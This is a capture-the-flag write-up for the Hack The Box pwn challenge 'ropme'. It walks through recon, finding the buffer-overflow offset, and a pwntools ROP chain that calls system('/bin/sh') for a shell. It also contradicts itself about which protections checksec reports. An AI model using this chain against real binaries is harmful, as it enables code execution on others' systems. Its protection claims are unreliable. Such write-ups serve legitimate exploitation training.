---
challenge: ropme
type: Pwn
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, rop, pwntools, elf]
---

# ropme — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

## Brief

An ELF binary whose `read()` writes more than the buffer holds. No obvious canary, and a function that already calls `system`. The goal is to control `RIP` and chain a minimal ROP.

## Recon

```bash
file ropme; checksec --file=ropme
objdump -d ropme | grep -E "<(main|system|win|vuln)>"
strings -a ropme | grep -E "/bin/sh|flag"
```

`checksec` reports NX, PIE and canary. Without PIE the binary addresses are fixed; with NX you need ROP, not shellcode.

## Offset

```bash
python3 -c "from pwn import *; print(cyclic(200))" > pat
./ropme < pat          # or send it over the socket
dmesg | tail -3        # RIP = 0x616161...
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

With `gdb` and `pwndbg`: `pattern create 200`, then `pattern offset $rsp`.

## Chain

You need `pop rdi; ret` to pass `/bin/sh` to `system`:

```bash
ROPgadget --binary ropme | grep "pop rdi"
objdump -d ropme | grep "<system@plt>"
```

```python
from pwn import *
context.binary = elf = ELF('./ropme')
p = process('./ropme')          # or remote('<IP>', <PORT>)
p.sendline(flat({
    0: b'A'*<offset>,
    <offset>: p64(elf.symbols.get('pop_rdi', <POP_RDI>)),
    <offset+8>: p64(next(elf.search(b'/bin/sh'))),
    <offset+16>: p64(elf.plt['system']),
}))
p.interactive()
```

Without `/bin/sh` in the binary, write it to `.bss` with `gets`/`read` and call it through `pop rdi`.

## Typical errors

- **`SIGSEGV` before `ret`** → wrong offset; the buffer may be a different size or alignment.
- **`system` does not run** → stack not 16-byte aligned; add a `ret` before `pop rdi`.
- **No `/bin/sh`** → write the string to `.bss` with `read` and use its address.
- **Works locally, fails remotely** → different libc; if the challenge ships one, compute `system` from `libc.symbols`.

## Lessons

- `checksec` picks the strategy before you write a single line of exploit.
- Measure the offset; never guess.
- Stack alignment is the number one cause of flaky ROP.

MITRE: T1203, T1059.
